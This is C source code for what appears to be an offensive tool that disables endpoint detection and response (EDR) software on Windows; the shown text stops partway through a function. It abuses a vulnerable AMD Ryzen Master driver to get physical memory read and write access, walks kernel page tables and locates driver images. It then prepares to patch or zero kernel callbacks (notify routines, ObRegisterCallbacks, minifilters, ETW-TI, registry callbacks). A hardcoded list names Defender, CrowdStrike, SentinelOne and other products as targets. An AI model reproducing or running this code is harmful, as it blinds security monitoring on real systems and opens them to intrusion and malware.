/*
 * all_edr_bypass.c — Combined EDR kernel callback bypass
 *
 * Single executable. Runs all 6 bypass modules in optimal order:
 *
 *   [1] Watchdog Kill       — patch IAT calls to re-registration functions
 *   [2] Ps* Notify          — zero PspCreate/Load/Thread notify arrays
 *   [3] ObRegisterCallbacks — zero PreOperation/PostOperation pointers
 *   [4] Minifilter          — patch PreOperation functions → xor eax,eax;ret
 *   [5] ETW-TI              — patch EtwTiLog* prologue + zero IsEnabled
 *   [6] CmRegisterCallback  — zero Function pointers
 *
 * Auto-detects EDR drivers (anything not in system/network/VM whitelist).
 * Shows CompanyName from VersionInfo for every unknown driver.
 * Single "Proceed? [y/N]" → apply all → "Press Enter to restore all".
 * Ctrl+C / console close → emergency restore.
 *
 * Build:
 *   x86_64-w64-mingw32-gcc -O2 -Wall -Wno-unused-function \
 *       -Wno-format-truncation -o all_edr_bypass.exe \
 *       all_edr_bypass.c -lkernel32 -ladvapi32 -lversion
 */

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winternl.h>
#include <tlhelp32.h>
#include <dbghelp.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/* ══════════════════════════════════════════════════════════════════════
 * §1  COMMON INFRASTRUCTURE
 * ══════════════════════════════════════════════════════════════════════ */

#define DEVICE_NAME      L"\\\\.\\AMDRyzenMasterDriverV20"
#define IOCTL_PHYS_READ  0x81112F08u
#define IOCTL_PHYS_WRITE 0x81112F0Cu
static HANDLE g_dev = INVALID_HANDLE_VALUE;

/* Physical ranges */
#define MAX_RANGES 64
typedef struct { uint64_t base, size; } PhysRange;
static PhysRange g_ranges[MAX_RANGES];
static int       g_nranges = 0;

static void load_ranges(void)
{
    HKEY h;
    if(RegOpenKeyExA(HKEY_LOCAL_MACHINE,
        "HARDWARE\\RESOURCEMAP\\System Resources\\Physical Memory",
        0,KEY_READ,&h)!=ERROR_SUCCESS) return;
    char vname[256]; DWORD vn,vd,type; uint8_t *buf=NULL; DWORD sz=0;
    for(DWORD i=0;;i++){
        vn=sizeof vname; vd=0;
        if(RegEnumValueA(h,i,vname,&vn,NULL,&type,NULL,&vd)==ERROR_NO_MORE_ITEMS) break;
        if((type!=3&&type!=8)||vd<20) continue;
        buf=(uint8_t*)malloc(vd); if(!buf) continue;
        if(RegQueryValueExA(h,vname,NULL,NULL,buf,&vd)==ERROR_SUCCESS){sz=vd;break;}
        free(buf); buf=NULL;
    }
    RegCloseKey(h);
    if(!buf||sz<20){free(buf);return;}
    DWORD cnt=*(DWORD*)(buf+16); uint8_t *p=buf+20;
    for(DWORD i=0;i<cnt&&g_nranges<MAX_RANGES;i++,p+=20){
        if(p+20>buf+sz||p[0]!=3) continue;
        g_ranges[g_nranges].base=*(uint64_t*)(p+4);
        g_ranges[g_nranges].size=*(uint64_t*)(p+12);
        g_nranges++;
    }
    free(buf);
}

static int pa_in_range(uint64_t pa, uint32_t sz)
{
    for(int i=0;i<g_nranges;i++)
        if(pa>=g_ranges[i].base&&pa+sz<=g_ranges[i].base+g_ranges[i].size) return 1;
    return 0;
}

/* Physical I/O */
/* chunk size — 256 KB gives 4x fewer IOCTL calls vs the old 64 KB */
#define CHUNK_SZ 0x40000

/* Pre-allocated I/O output buffer: avoids a malloc+free per phys_read call.
 * Used for all reads ≤ CHUNK_SZ (the common case).  Larger reads fall back
 * to heap allocation (rare: only for small fixed-size struct reads > 256 KB,
 * which never happen in practice). */
static uint8_t g_io_out[12 + CHUNK_SZ];

static int phys_read(uint64_t pa, void *buf, uint32_t sz)
{
    uint8_t in[12]; *(uint64_t*)in=pa; *(uint32_t*)(in+8)=sz;
    uint32_t osz=12+sz;
    uint8_t *out; void *dyn=NULL;
    if(osz<=sizeof g_io_out) out=g_io_out;
    else{dyn=malloc(osz);if(!dyn) return 0;out=(uint8_t*)dyn;}
    DWORD got=0;
    BOOL ok=DeviceIoControl(g_dev,IOCTL_PHYS_READ,in,12,out,osz,&got,NULL);
    if(ok&&got>=12) memcpy(buf,out+12,sz);
    free(dyn); return ok&&got>=12;
}
static int phys_write(uint64_t pa, const void *data, uint32_t sz)
{
    if(!pa_in_range(pa,sz)) return 0;
    uint32_t isz=12+sz; uint8_t *in=(uint8_t*)malloc(isz); if(!in) return 0;
    *(uint64_t*)in=pa; *(uint32_t*)(in+8)=sz; memcpy(in+12,data,sz);
    DWORD got=0;
    BOOL ok=DeviceIoControl(g_dev,IOCTL_PHYS_WRITE,in,isz,NULL,0,&got,NULL);
    free(in); return ok;
}

/* ── Kernel page table walker ───────────────────────────────────────────
 * Windows keeps a self-referencing PML4 entry at index 0x1ED so the kernel
 * can access its own page tables via well-known VAs.  We exploit that:
 * PML4[0x1ED] must point back to the PML4's own physical frame.
 * Scanning only the first 128 MB is sufficient on real hardware; on VMs the
 * PML4 is typically in the first 4 MB.
 * ─────────────────────────────────────────────────────────────────────── */
static uint64_t g_kernel_cr3=0;

static uint64_t find_kernel_cr3(void)
{
    /* Pass 1 — fast: check only slot 0x1ED (standard Windows 10 / early 11).
     * One 8-byte read per 4 KB page, searches 0-256 MB. */
    for(int ri=0;ri<g_nranges;ri++){
        if(g_ranges[ri].base>=0x10000000ULL) continue;
        uint64_t re=g_ranges[ri].base+g_ranges[ri].size;
        if(re>0x10000000ULL) re=0x10000000ULL;
        for(uint64_t pa=g_ranges[ri].base;pa<re;pa+=0x1000){
            uint64_t e=0;
            if(!phys_read(pa+0x1ED*8,&e,8)) continue;
            if((e&1)&&(e&0x000FFFFFFFFFF000ULL)==pa) return pa;
        }
    }

    /* Pass 2 — thorough: read entire 4 KB page and check all 512 PML4 slots.
     * Windows 11 22H2+ randomises the self-reference index (KASLR for PML4),
     * so it can be anywhere in the upper-half (slots 0x100-0x1FF).
     * Limit to first 64 MB — early-boot allocations always live there. */
    static uint8_t s_pg[4096];
    for(int ri=0;ri<g_nranges;ri++){
        if(g_ranges[ri].base>=0x4000000ULL) continue; /* above 64 MB */
        uint64_t re=g_ranges[ri].base+g_ranges[ri].size;
        if(re>0x4000000ULL) re=0x4000000ULL;
        for(uint64_t pa=g_ranges[ri].base;pa<re;pa+=0x1000){
            if(!phys_read(pa,s_pg,4096)) continue;
            for(int idx=0x100;idx<0x200;idx++){          /* kernel-half only */
                uint64_t e=*(uint64_t*)(s_pg+idx*8);
                if(!(e&1)) continue;
                if((e&0x000FFFFFFFFFF000ULL)==pa) return pa;
            }
        }
    }
    return 0;
}

/* 4-level page table walk: kernel VA → physical address (0 = not mapped) */
static uint64_t va_to_pa(uint64_t va)
{
    if(!g_kernel_cr3) return 0;
    uint64_t pml4i=(va>>39)&0x1FF, pdpi=(va>>30)&0x1FF;
    uint64_t pdi  =(va>>21)&0x1FF, pti =(va>>12)&0x1FF;
    uint64_t e=0;
    if(!phys_read(g_kernel_cr3+pml4i*8,&e,8)||!(e&1)) return 0;
    if(!phys_read((e&0x000FFFFFFFFFF000ULL)+pdpi*8,&e,8)||!(e&1)) return 0;
    if(e&(1ULL<<7)) return (e&0x000FFFFFC0000000ULL)|(va&0x3FFFFFFF); /* 1 GB */
    if(!phys_read((e&0x000FFFFFFFFFF000ULL)+pdi*8,&e,8)||!(e&1)) return 0;
    if(e&(1ULL<<7)) return (e&0x000FFFFFFFE00000ULL)|(va&0x1FFFFF);  /* 2 MB */
    if(!phys_read((e&0x000FFFFFFFFFF000ULL)+pti*8,&e,8)||!(e&1)) return 0;
    return (e&0x000FFFFFFFFFF000ULL)|(va&0xFFF);
}

/* Module list */
typedef NTSTATUS(NTAPI*PFN_NTQSI)(ULONG,PVOID,ULONG,PULONG);
typedef struct {
    HANDLE Section; PVOID MappedBase,ImageBase;
    ULONG  ImageSize,Flags;
    USHORT LoadOrderIndex,InitOrderIndex,LoadCount,OffsetToFileName;
    CHAR   FullPathName[256];
} MOD_ENTRY;
typedef struct { ULONG NumberOfModules; MOD_ENTRY Modules[1]; } MOD_LIST;

static MOD_LIST *get_module_list(void)
{
    PFN_NTQSI fn=(PFN_NTQSI)GetProcAddress(GetModuleHandleA("ntdll.dll"),"NtQuerySystemInformation");
    if(!fn) return NULL;
    ULONG sz=0x80000; MOD_LIST *ml=NULL; NTSTATUS st;
    do{free(ml);ml=(MOD_LIST*)malloc(sz*=2);st=fn(11,ml,sz,NULL);}
    while(st==(NTSTATUS)0xC0000004L);
    if(st){free(ml);return NULL;} return ml;
}

#define MAX_MODS 256
typedef struct { uint64_t base,size; char name[64]; } KMod;
static KMod g_mods[MAX_MODS]; static int g_nmods=0;

static void load_module_map(void)
{
    MOD_LIST *ml=get_module_list(); if(!ml) return;
    for(ULONG i=0;i<ml->NumberOfModules&&g_nmods<MAX_MODS;i++){
        g_mods[g_nmods].base=(uint64_t)ml->Modules[i].ImageBase;
        g_mods[g_nmods].size=ml->Modules[i].ImageSize;
        const char *fn=ml->Modules[i].FullPathName+ml->Modules[i].OffsetToFileName;
        strncpy(g_mods[g_nmods].name,fn,63); g_mods[g_nmods].name[63]='\0';
        g_nmods++;
    }
    free(ml);
}

static const char *va_to_driver(uint64_t va)
{ for(int i=1;i<g_nmods;i++) if(va>=g_mods[i].base&&va<g_mods[i].base+g_mods[i].size) return g_mods[i].name; return NULL; }
static const char *va_to_driver_ex(uint64_t va,uint64_t *rva)
{ for(int i=1;i<g_nmods;i++) if(va>=g_mods[i].base&&va<g_mods[i].base+g_mods[i].size){ if(rva)*rva=va-g_mods[i].base; return g_mods[i].name; } return NULL; }
static int va_in_any_module(uint64_t va)
{ for(int i=0;i<g_nmods;i++) if(va>=g_mods[i].base&&va<g_mods[i].base+g_mods[i].size) return 1; return 0; }

/* Driver classification */
typedef enum { DRV_SYSTEM, DRV_NETWORK, DRV_VM, DRV_OTHER } DrvClass;
static DrvClass classify_driver(const char *n)
{
    static const char *SYS[]={
        "Ntfs.sys","FLTMGR.SYS","fileinfo.sys","Wof.sys","refs.sys","FastFat.sys",
        "exfat.sys","cdfs.sys","udfs.sys","rdbss.sys","luafv.sys","npfs.sys","mup.sys",
        "DfsC.sys","dfsc.sys","mrxsmb.sys","mrxsmb10.sys","mrxsmb20.sys","rdpdr.sys",
        "WebDAVSystem.sys","volmgrx.sys","volmgr.sys","disk.sys","storport.sys",
        "classpnp.sys","CLFS.SYS","fvevol.sys","iorate.sys","storqosflt.sys",
        "EhStorClass.sys","win32kfull.sys","win32kbase.sys","ksecdd.sys","cng.sys",
        "WindowsTrustedRT.sys","WindowsTrustedRTProxy.sys","bindflt.sys","wcifs.sys",
        "PrjFlt.sys","cloud_filter.sys","cldflt.sys","FileCrypt.sys","WinSetupMon.sys",
        "FsDepends.sys","peauth.sys","sysdiag.sys","bfs.sys","Ndu.sys",
        "SleepStudyHelper.sys","applockerfltr.sys","werkernel.sys","pcw.sys",
        "DxgKrnl.sys","dxgmms2.sys","condrv.sys","CI.dll","ci.dll",NULL};
    static const char *NET[]={
        "tcpip.sys","HTTP.sys","msquic.sys","tdx.sys","afd.sys","netbt.sys",
        "ndis.sys","netio.sys","pacer.sys","rpcxdr.sys","nsiproxy.sys","wfplwfs.sys",
        "ndisimplatform.sys","ndistapi.sys","ndiswan.sys","tunnel.sys","PPTP.sys",
        "rassstp.sys","wanarp.sys","wanarpv6.sys","bowser.sys","srv2.sys","srvnet.sys",NULL};
    static const char *VM[]={
        "vmhgfs.sys","vmmemctl.sys","vmxnet3nd.sys","vmci.sys","vmbus.sys",
        "hvsocket.sys","hyperkbd.sys","hvnetvsc.sys","VBoxGuest.sys","VBoxMouse.sys",
        "VBoxSF.sys","xenfilt.sys","xenbus.sys","xenvbd.sys","xenvif.sys",NULL};
    for(int i=0;SYS[i];i++) if(_stricmp(n,SYS[i])==0) return DRV_SYSTEM;
    for(int i=0;NET[i];i++) if(_stricmp(n,NET[i])==0) return DRV_NETWORK;
    for(int i=0;VM[i]; i++) if(_stricmp(n,VM[i]) ==0) return DRV_VM;
    return DRV_OTHER;
}

/* PE export RVA lookup */
static uint32_t pe_export_rva(const uint8_t *pe, size_t fsz, const char *sym)
{
    if(fsz<0x100||pe[0]!='M'||pe[1]!='Z') return 0;
    int32_t elf=*(int32_t*)(pe+0x3C);
    if(elf<=0||(uint32_t)elf+0x90>fsz) return 0;
    uint16_t ns=*(uint16_t*)(pe+elf+6),osz=*(uint16_t*)(pe+elf+20);
    uint32_t sb=(uint32_t)elf+24+osz;
    #define R2F(rva,fo) do{(fo)=0;\
        for(uint16_t _i=0;_i<ns;_i++){\
            uint32_t _s=sb+_i*40,_va=*(uint32_t*)(pe+_s+12);\
            uint32_t _vsz=*(uint32_t*)(pe+_s+16);if(!_vsz)_vsz=*(uint32_t*)(pe+_s+24);\
            uint32_t _fo=*(uint32_t*)(pe+_s+20);\
            if((rva)>=_va&&(rva)<_va+_vsz){(fo)=_fo+((rva)-_va);break;}}}\
        while(0)
    uint32_t erva=*(uint32_t*)(pe+elf+0x88),efo=0; R2F(erva,efo);
    if(!efo||efo+40>fsz) return 0;
    const uint8_t *exp=pe+efo;
    uint32_t nn=*(uint32_t*)(exp+0x18);
    uint32_t rfn=*(uint32_t*)(exp+0x1C),rnm=*(uint32_t*)(exp+0x20),rod=*(uint32_t*)(exp+0x24);
    uint32_t ffn=0,fnm=0,fod=0; R2F(rfn,ffn); R2F(rnm,fnm); R2F(rod,fod);
    if(!ffn||!fnm||!fod) return 0;
    for(uint32_t i=0;i<nn;i++){
        uint32_t nrva=*(uint32_t*)(pe+fnm+i*4),nfo=0; R2F(nrva,nfo);
        if(!nfo||nfo>=fsz) continue;
        if(strcmp((char*)(pe+nfo),sym)==0){
            uint16_t ord=*(uint16_t*)(pe+fod+i*2);
            return *(uint32_t*)(pe+ffn+ord*4);
        }
    }
    #undef R2F
    return 0;
}

/* PE: RVA in writable data section? */
static int rva_in_data_section(const uint8_t *pe, size_t pe_sz, uint32_t rva)
{
    if(pe_sz<0x40||pe[0]!='M'||pe[1]!='Z') return 0;
    uint32_t po=*(uint32_t*)(pe+0x3C); if(po+24>pe_sz) return 0;
    uint16_t ns=*(uint16_t*)(pe+po+6),os=*(uint16_t*)(pe+po+20);
    uint32_t st=po+24+os;
    for(int i=0;i<ns;i++){
        uint32_t s=st+i*40; if(s+40>pe_sz) break;
        uint32_t va=*(uint32_t*)(pe+s+12),vs=*(uint32_t*)(pe+s+16),chr=*(uint32_t*)(pe+s+36);
        if(rva<va||rva>=va+vs) continue;
        int ic=(chr&0x20)||(chr&0x20000000U), iw=(chr&0x40)&&(chr&0x80000000U);
        return iw&&!ic;
    }
    return 0;
}

/* RVA → file offset */
static uint32_t rva_to_fo(const uint8_t *pe, uint32_t fsz, uint32_t rva)
{
    if(fsz<0x40||pe[0]!='M'||pe[1]!='Z') return 0;
    uint32_t po=*(uint32_t*)(pe+0x3C); if(po+24>fsz) return 0;
    uint16_t ns=*(uint16_t*)(pe+po+6),os=*(uint16_t*)(pe+po+20);
    uint32_t st=po+24+os;
    for(int i=0;i<ns;i++){
        uint32_t s=st+i*40; if(s+40>fsz) break;
        uint32_t va=*(uint32_t*)(pe+s+12),vs=*(uint32_t*)(pe+s+16),ro=*(uint32_t*)(pe+s+20);
        if(rva>=va&&rva<va+vs) return ro+(rva-va);
    }
    return 0;
}

/* Scan chunk buffer — sized to match CHUNK_SZ defined in phys_read section */
static uint8_t g_chunk[CHUNK_SZ];

/* ntoskrnl PA via 2MB NtBuildNumber scan */
static uint64_t find_ntoskrnl_pa(const char *path)
{
    HANDLE hf=CreateFileA(path,GENERIC_READ,FILE_SHARE_READ,NULL,OPEN_EXISTING,0,NULL);
    if(hf==INVALID_HANDLE_VALUE) return 0;
    DWORD fsz=GetFileSize(hf,NULL); uint8_t *pe=(uint8_t*)malloc(fsz); DWORD rd=0;
    ReadFile(hf,pe,fsz,&rd,NULL); CloseHandle(hf);
    uint32_t rva=pe_export_rva(pe,fsz,"NtBuildNumber"); free(pe); if(!rva) return 0;
    uint32_t ssd=*(uint32_t*)(0x7FFE0000+0x260)&0xFFFF;
    uint32_t c0=ssd,c1=ssd|0xF0000000,c2=ssd|0xC0000000;
    const uint64_t STEP=0x200000ULL;
    for(int ri=0;ri<g_nranges;ri++){
        uint64_t base=(g_ranges[ri].base+STEP-1)&~(STEP-1),end=g_ranges[ri].base+g_ranges[ri].size;
        for(uint64_t pa=base;pa<end;pa+=STEP){
            if(!pa_in_range(pa+rva,4)) continue;
            uint32_t v=0; phys_read(pa+rva,&v,4);
            if(v!=c0&&v!=c1&&v!=c2) continue;
            uint16_t mz=0; phys_read(pa,&mz,2);
            if(mz==0x5A4D) return pa;
        }
    }
    return 0;
}

/* Driver path finder */
static int find_driver_path(const char *drv, char *out, int max)
{
    char wd[512],sd[512]; GetWindowsDirectoryA(wd,sizeof wd); GetSystemDirectoryA(sd,sizeof sd);
    snprintf(out,max,"%s\\drivers\\%s",sd,drv); if(GetFileAttributesA(out)!=INVALID_FILE_ATTRIBUTES) return 1;
    snprintf(out,max,"%s\\%s",sd,drv);          if(GetFileAttributesA(out)!=INVALID_FILE_ATTRIBUTES) return 1;
    snprintf(out,max,"%s\\SysWOW64\\drivers\\%s",wd,drv); return GetFileAttributesA(out)!=INVALID_FILE_ATTRIBUTES;
}

/* Driver PA via MZ+TimeDateStamp scan */
static uint64_t find_driver_pa(const char *drv)
{
    char path[1024]; if(!find_driver_path(drv,path,sizeof path)) return 0;
    HANDLE hf=CreateFileA(path,GENERIC_READ,FILE_SHARE_READ,NULL,OPEN_EXISTING,0,NULL);
    if(hf==INVALID_HANDLE_VALUE) return 0;
    uint8_t hdr[0x200]={0}; DWORD rd=0; ReadFile(hf,hdr,sizeof hdr,&rd,NULL); CloseHandle(hf);
    if(rd<0x50||hdr[0]!='M'||hdr[1]!='Z') return 0;
    uint32_t po=*(uint32_t*)(hdr+0x3C); if(po+12>rd||*(uint32_t*)(hdr+po)!=0x00004550) return 0;
    uint16_t mach=*(uint16_t*)(hdr+po+4); uint32_t ts=*(uint32_t*)(hdr+po+8);
    uint64_t lp=0;
    for(int ri=0;ri<g_nranges;ri++){
        uint64_t re=g_ranges[ri].base+g_ranges[ri].size;
        for(uint64_t cpa=g_ranges[ri].base;cpa<re;cpa+=CHUNK_SZ){
            if(cpa-lp>=0x80000000ULL){printf("      [%5lluMB]\r",(unsigned long long)(cpa>>20));fflush(stdout);lp=cpa;}
            uint64_t csz=re-cpa; if(csz>CHUNK_SZ) csz=CHUNK_SZ;
            if(!phys_read(cpa,g_chunk,(uint32_t)csz)) continue;
            for(uint64_t off=0;off+0x50<=csz;off+=0x1000){
                if(g_chunk[off]!='M'||g_chunk[off+1]!='Z') continue;
                uint32_t peo=*(uint32_t*)(g_chunk+off+0x3C); if(peo+12>csz-off) continue;
                if(*(uint32_t*)(g_chunk+off+peo)!=0x00004550) continue;
                if(*(uint16_t*)(g_chunk+off+peo+4)!=mach) continue;
                if(*(uint32_t*)(g_chunk+off+peo+8)!=ts) continue;
                printf("      Found at PA=0x%016llX\n",(unsigned long long)(cpa+off));
                return cpa+off;
            }
        }
    }
    printf("      Not found\n"); return 0;
}

/* Driver PA via function prologue pattern scan (fallback if header zeroed) */
static uint64_t find_driver_pa_by_func(const char *drv, uint64_t func_va, uint64_t drv_va)
{
    uint32_t rva=(uint32_t)(func_va-drv_va);
    char path[1024]; if(!find_driver_path(drv,path,sizeof path)) return 0;
    HANDLE hf=CreateFileA(path,GENERIC_READ,FILE_SHARE_READ,NULL,OPEN_EXISTING,0,NULL);
    if(hf==INVALID_HANDLE_VALUE) return 0;
    DWORD fsz=GetFileSize(hf,NULL); uint8_t *pe=(uint8_t*)malloc(fsz); DWORD rd=0;
    ReadFile(hf,pe,fsz,&rd,NULL); CloseHandle(hf);
    uint32_t fo=rva_to_fo(pe,fsz,rva); uint8_t pat[16]={0};
    if(fo&&fo+16<=fsz) memcpy(pat,pe+fo,16);
    free(pe);
    if(!pat[0]||pat[0]==0xCC||pat[0]==0x90) return 0;
    uint64_t found=0; int nf=0; uint64_t lp=0;
    for(int ri=0;ri<g_nranges;ri++){
        uint64_t re=g_ranges[ri].base+g_ranges[ri].size;
        for(uint64_t cpa=g_ranges[ri].base;cpa<re;cpa+=CHUNK_SZ){
            if(cpa-lp>=0x80000000ULL){printf("      [%5lluMB]\r",(unsigned long long)(cpa>>20));fflush(stdout);lp=cpa;}
            uint64_t csz=re-cpa; if(csz>CHUNK_SZ) csz=CHUNK_SZ;
            if(!phys_read(cpa,g_chunk,(uint32_t)csz)) continue;
            for(uint64_t off=0;off+16<=csz;off++){
                if(memcmp(g_chunk+off,pat,16)) continue;
                uint64_t base=cpa+off-rva;
                if(pa_in_range(base,0x1000)){if(!nf)found=cpa+off;nf++;}
            }
        }
    }
    printf("      \n");
    if(nf==1){printf("      func_pa=0x%016llX  drv_base=0x%016llX\n",(unsigned long long)found,(unsigned long long)(found-rva));return found-rva;}
    if(nf>1) printf("      %d matches — ambiguous\n",nf);
    return 0;
}

/* Per-driver PA cache — prevents 4x physical scan for same driver (e.g. WdFilter 4 groups) */
#define PA_CACHE_MAX 64
static struct{char n[64];uint64_t pa;}g_pa_cache[PA_CACHE_MAX]; static int g_pa_n=0;
static uint64_t find_driver_pa_cached(const char *drv)
{
    for(int i=0;i<g_pa_n;i++) if(_stricmp(g_pa_cache[i].n,drv)==0) return g_pa_cache[i].pa;
    uint64_t pa=find_driver_pa(drv);
    if(pa&&g_pa_n<PA_CACHE_MAX){strncpy(g_pa_cache[g_pa_n].n,drv,63);g_pa_cache[g_pa_n++].pa=pa;}
    return pa;
}

/* CompanyName from VersionInfo */
static const char *get_driver_company(const char *drv)
{
    static char s[128]; char path[1024];
    if(!find_driver_path(drv,path,sizeof path)) return NULL;
    DWORD dummy; DWORD sz=GetFileVersionInfoSizeA(path,&dummy); if(!sz) return NULL;
    void *buf=malloc(sz); if(!buf) return NULL;
    if(!GetFileVersionInfoA(path,0,sz,buf)){free(buf);return NULL;}
    static const char *Q[]={"\\StringFileInfo\\040904B0\\CompanyName",
                             "\\StringFileInfo\\040904E4\\CompanyName",
                             "\\StringFileInfo\\000004B0\\CompanyName",NULL};
    const char *found=NULL;
    for(int i=0;Q[i]&&!found;i++){
        UINT len=0; char *v=NULL;
        if(VerQueryValueA(buf,(char*)Q[i],(void**)&v,&len)&&len>0){strncpy(s,v,127);s[127]='\0';found=s;}
    }
    free(buf); return found;
}

/* Publisher check helpers — cached, at most one file read per unique name */
static int is_microsoft_driver(const char *n)
{
    static struct{char n[64];int r;}c[128]; static int nc=0;
    for(int i=0;i<nc;i++) if(_stricmp(c[i].n,n)==0) return c[i].r;
    const char *co=get_driver_company(n);
    int r=(co&&strstr(co,"Microsoft"))?1:0;
    if(nc<128){strncpy(c[nc].n,n,63);c[nc++].r=r;} return r;
}
static int is_hw_vendor(const char *n)
{
    static struct{char n[64];int r;}c[128]; static int nc=0;
    for(int i=0;i<nc;i++) if(_stricmp(c[i].n,n)==0) return c[i].r;
    const char *co=get_driver_company(n); int r=0;
    static const char *HW[]={"Intel","NVIDIA","Advanced Micro","Realtek","Qualcomm",
        "Atheros","Broadcom","Marvell","VMware","Oracle","Citrix",NULL};
    if(co) for(int i=0;HW[i];i++) if(strstr(co,HW[i])){r=1;break;}
    if(nc<128){strncpy(c[nc].n,n,63);c[nc++].r=r;} return r;
}

/* Known EDR/AV products — always targeted regardless of publisher.
 * Non-MS/non-HW DRV_OTHER drivers are also targeted (catch-all for
 * unknown 3rd-party security products). */
static const char *g_edr_list[]={
    /* Windows Defender / Microsoft ATP */
    "WdFilter.sys","WdNisDrv.sys","WdBoot.sys","wddevflt.sys","MpFilter.sys",
    "SenseCncProxy.sys","SenseIR.sys","MsSecFlt.sys",
    /* Huorong (火绒) */
    "hrdevmon.sys","hrwfpdrv.sys",
    /* CrowdStrike */
    "csagent.sys","csdevicecontrol.sys","csimp.sys",
    /* Carbon Black */
    "carbonblackk.sys","cbk7.sys","cbstream.sys",
    /* SentinelOne */
    "SentinelMonitor.sys","SentinelDeviceControl.sys",
    /* ESET */
    "ehdrv.sys","eamonm.sys","epfw.sys","epfwwfp.sys",
    /* Kaspersky */
    "klflt.sys","klhk.sys","kldisk.sys","klwfp.sys",
    /* Bitdefender */
    "bddk.sys","bdfndisf6.sys","bdamsi.sys",
    /* McAfee/Trellix */
    "mfencoas.sys","mfefirek.sys","mfehidk.sys","mfewfpk.sys",
    /* Palo Alto */
    "pxeclk.sys","PanMSAgent.sys",
    /* Cybereason */
    "AngieFilter.sys","CRExecPrev.sys",
    /* Elastic */
    "ElasticEndpoint.sys",
    /* Trend Micro */
    "tmcomm.sys","TmEsFlt.sys","tmxpflt.sys",
    NULL
};
static int is_edr_target(const char *n)
{
    /* Explicitly known EDR product → always target (bypasses all gates below) */
    for(int i=0;g_edr_list[i];i++) if(_stricmp(n,g_edr_list[i])==0) return 1;

    /* Vendor wildcard patterns — catch unreleased/renamed driver variants:
     *   hr*.sys  — all Huorong (火绒) drivers: hrdevmon, hrwfpdrv, HrSafe,
     *              HrBoot, HrFileMon, HrNetMon, HrProcMon, etc.
     * Pattern is tight: must end in .sys and prefix must be exactly "hr" (2 chars). */
    {
        size_t nl=strlen(n);
        if(nl>6&&_stricmp(n+nl-4,".sys")==0&&_strnicmp(n,"hr",2)==0) return 1;
    }

    /* Must be DRV_OTHER (not in system/network/VM whitelist) */
    if(classify_driver(n)!=DRV_OTHER) return 0;
    /* Skip Microsoft OS drivers and common hardware vendors */
    if(is_microsoft_driver(n)||is_hw_vendor(n)) return 0;
    /* Pattern-based skip for stripped Windows/HW components (no version info):
     *   dump_*.sys  — crash-dump filter copies    AMDRyzen*.sys — our own driver
     *   vm3d*.sys   — VMware 3D display           mcupdate_*.dll — microcode
     *   Basic*.sys  — display/render stubs */
    if(_strnicmp(n,"dump_",5)==0||_strnicmp(n,"AMDRyzen",8)==0||
       _strnicmp(n,"vm3d",4)==0||_strnicmp(n,"mcupdate_",9)==0||
       _strnicmp(n,"Basic",5)==0) return 0;
    /* Conservative final gate: real AV/EDR products always embed version info.
     * Stripped Windows/HW drivers never do → treat as false positive. */
    if(!get_driver_company(n)) return 0;
    return 1; /* non-MS, non-HW, has version info → likely 3rd-party security */
}

/* Cache eviction */
#define EVICT_SZ (256*1024*1024)
static void cache_evict_once(void)
{
    volatile uint8_t *p=(volatile uint8_t*)VirtualAlloc(NULL,EVICT_SZ,MEM_COMMIT|MEM_RESERVE,PAGE_READWRITE);
    if(!p){Sleep(100);return;}
    for(size_t i=0;i<EVICT_SZ;i+=64) p[i]=(uint8_t)(i>>6);
    volatile uint64_t s=0; for(size_t i=EVICT_SZ;i>=64;i-=64) s^=p[i-64]; (void)s;
    VirtualFree((LPVOID)p,0,MEM_RELEASE); Sleep(10);
}
static void cache_evict_multiccd(void)
{
    SYSTEM_INFO si; GetSystemInfo(&si); DWORD nc=si.dwNumberOfProcessors;
    HANDLE t=GetCurrentThread(); DWORD_PTR orig=SetThreadAffinityMask(t,1);
    SetThreadAffinityMask(t,1ULL); Sleep(1); cache_evict_once();
    if(nc>1){SetThreadAffinityMask(t,(DWORD_PTR)1<<(nc-1));Sleep(1);cache_evict_once();}
    SetThreadAffinityMask(t,orig);
}

/* Evict L1/L2/L3 on EVERY logical CPU — required when kernel threads on other
 * cores have cached EPROCESS.Protection in their private L1/L2. */
static void cache_evict_all_cores(void)
{
    SYSTEM_INFO si; GetSystemInfo(&si); DWORD nc=si.dwNumberOfProcessors;
    HANDLE t=GetCurrentThread(); DWORD_PTR orig=SetThreadAffinityMask(t,1);
    for(DWORD i=0;i<nc;i++){
        SetThreadAffinityMask(t,(DWORD_PTR)1<<i);
        Sleep(1);
        cache_evict_once();
    }
    SetThreadAffinityMask(t,orig);
}

static void enable_debug_privilege(void)
{
    HANDLE hTok; TOKEN_PRIVILEGES tp={1};
    if(!OpenProcessToken(GetCurrentProcess(),TOKEN_ADJUST_PRIVILEGES|TOKEN_QUERY,&hTok)) return;
    LookupPrivilegeValueA(NULL,"SeDebugPrivilege",&tp.Privileges[0].Luid);
    tp.Privileges[0].Attributes=SE_PRIVILEGE_ENABLED;
    AdjustTokenPrivileges(hTok,FALSE,&tp,0,NULL,NULL); CloseHandle(hTok);
}

#define MAX_SANE_RVA 0x400000ULL
#define PATCH3_LEN 3
static const uint8_t PATCH3[3]={0x31,0xC0,0xC3}; /* xor eax,eax; ret */
static const uint8_t WKPATCH[6]={0x48,0x31,0xC0,0x90,0x90,0x90}; /* xor rax,rax; 3xnop */

/* ══════════════════════════════════════════════════════════════════════
 * §2  MODULE: WATCHDOG KILL
 * ══════════════════════════════════════════════════════════════════════ */

#define WK_MAX 512
typedef struct {
    uint64_t call_pa, call_va, drv_va, iat_va, target_va;
    const char *func_name; char drv[64];
    uint8_t orig[6]; int patched;
} WkSite;
static WkSite g_wk[WK_MAX]; static int g_wk_n=0;

static const char *WK_FUNCS[]={
    "PsSetCreateProcessNotifyRoutine","PsSetCreateProcessNotifyRoutineEx",
    "PsSetCreateProcessNotifyRoutineEx2","PsSetLoadImageNotifyRoutine",
    "PsSetLoadImageNotifyRoutineEx","PsSetCreateThreadNotifyRoutine",
    "ObRegisterCallbacks","CmRegisterCallbackEx","CmRegisterCallback",NULL
};
static uint64_t g_wk_vas[16]; static int g_wk_nvas=0;

static void wk_resolve_targets(const uint8_t *pe, size_t pe_sz, uint64_t nt_va)
{
    g_wk_nvas=0;
    for(int i=0;WK_FUNCS[i]&&g_wk_nvas<16;i++){
        uint32_t rva=pe_export_rva(pe,pe_sz,WK_FUNCS[i]);
        g_wk_vas[g_wk_nvas++]=rva ? nt_va+rva : 0;
    }
}

static void wk_scan_driver(const char *name, uint64_t drv_pa, uint64_t drv_va, uint64_t drv_sz)
{
